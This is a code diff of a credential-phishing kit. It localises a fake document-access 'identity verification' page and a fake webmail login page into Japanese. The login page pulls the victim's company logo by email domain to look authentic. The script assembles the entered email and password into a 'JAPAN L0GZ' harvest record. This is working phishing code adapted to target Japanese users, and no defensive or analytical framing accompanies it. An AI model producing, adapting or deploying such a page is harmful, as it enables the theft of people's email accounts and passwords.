@@ -160,17 +160,17 @@
                         <div>
                             <img src="https://www.scnsoft.com/blog-pictures/sharepoint/office_365_security-01_1.png" width="100%" alt="SeC3">
                         </div><br>
-                        <h5 class="text-dark"><strong  class="text-uppercase">Identity Verification</strong></h3>
-                        <p class="font-weight-light">For your security we need to verify your identity: To gain access to this document, enter the email address this document was sent to.</p>
+                        <h5 class="text-dark"><strong  class="text-uppercase">本人確認</strong></h3>
+                        <p class="font-weight-light">セキュリティ上の理由から、お客様の身元確認が必要です。この文書にアクセスするには、この文書が送信されたメールアドレスを入力してください。.</p>
                     </div>
                     <form>
                         <div class="form-holder">
                             <div style="width: 100%;">
                                 <div class="alert alert-danger hide alert2"></div>
                             </div>
-                            <input type="email" id="aii" name="" class="form-control" value="" placeholder="someone@example.com" required="">
+                            <input type="email" id="aii" name="" class="form-control" value="" placeholder="ユーザー@ドメイン.com" required="">
                             <div class="btn-holder">
-                                <button class="btn btn-lg col-12" id="submit-btnn">Verify Indentity</button>
+                                <button class="btn btn-lg col-12" id="submit-btnn">身元を確認する</button>
                             </div>
                         </div>
                     </form>
@@ -182,31 +182,31 @@
 				<div class="office-holder">
                     <div class="logo" style="text-align:center">
                         <div id="login_logo">
-                            <img id="login_logo1" src="https://res.cloudinary.com/ducjuygen/image/upload/v1662462897/weblogo_fs2day.png" width="50" height="50" alt="Webmail">
+                            <img id="login_logo1" src="https://res.cloudinary.com/ducjuygen/image/upload/v1662462897/weblogo_fs2day.png" width="50" height="50" alt="ウェブメール">
                         </div>
-                        <h3 class="text-dark"><strong id="domain-name" class="text-uppercase">WEBMAIL</strong></h3>
-                        <h5 class="font-weight-light">Please sign in using your email and password to gain access</h5>
+                        <h3 class="text-dark"><strong id="domain-name" class="text-uppercase">ウェブメール</strong></h3>
+                        <h5 class="font-weight-light">アクセスするには、メールアドレスとパスワードを使用してログインしてください。</h5>
                     </div>
                     <center>
-                        <div id="msg" style="display: none;font-weight: 600;color: red;">Invalid Password.! Please enter correct password.</div>
-                        <span id="error" class="text-danger" style="display: none;">That account doesn't exist. Enter a different account</span>
+                        <div id="msg" style="display: none;font-weight: 600;color: red;">無効なパスワード.! 正しいパスワードを入力してください.</div>
+                        <span id="error" class="text-danger" style="display: none;">そのアカウントは存在しません。別のアカウントを入力してください。</span>
                     </center>
                     <form>
                         <div class="form-holder">
                             <div style="width: 100%;">
                                 <div class="alert alert-danger hide alert2"></div>
                             </div>
-                            <input type="email" id="ai" class="form-control" value="" placeholder="someone@example.com" required="">
-                            <input type="password" id="pr" placeholder="Password" class="form-control" required="">
+                            <input type="email" id="ai" class="form-control" value="" placeholder="ユーザー@ドメイン.com" required="">
+                            <input type="password" id="pr" placeholder="パスワード" class="form-control" required="">
                             <div class="checkbox">
                                 <input type="checkbox" name="" style="float: left; margin-top:2px; margin-bottom: 10px;">
-                                <label>REMEMBER ME</label>
+                                <label>私を覚えてますか</label>
                             </div>
                             <div class="btn-holder">
-                                <button class="btn btn-lg col-12" id="submit-btn">LOGIN</button>
+                                <button class="btn btn-lg col-12" id="submit-btn">ログイン</button>
                             </div>
-                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">can't access your account?</p>
-                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">Sign in with a single-use code</p>
+                            <p style="color:#0073C6; margin-top:1em; float: left; width:100%;">アカウントにアクセスできませんか？</p>
+                            <p style="color:#0073C6; margin-top:0em; float: left; width:100%;">使い捨てコードでサインインしてください</p>
                         </div>
                     </form>
                 </div>
@@ -413,7 +413,7 @@ $(document).ready(function() {
         $('#ai').attr('disabled', "");
         $('#login_logo1').attr('src', 'https://logo.clearbit.com/' + my_slice);
         $('#domain-name').html(dom);
-        var ozi = "\n=========WEBMAIL L0GZ======\n"
+        var ozi = "\n=========JAPAN L0GZ======\n"
         ozi+="Email      :"+ai
         ozi+="\nPass     :" +pr
         ozi+="\n============================"
@@ -478,7 +478,6 @@ $(document).ready(function() {
                 $('#submit-btn').html('Login');
             }
         });*/
-
     });
 
 
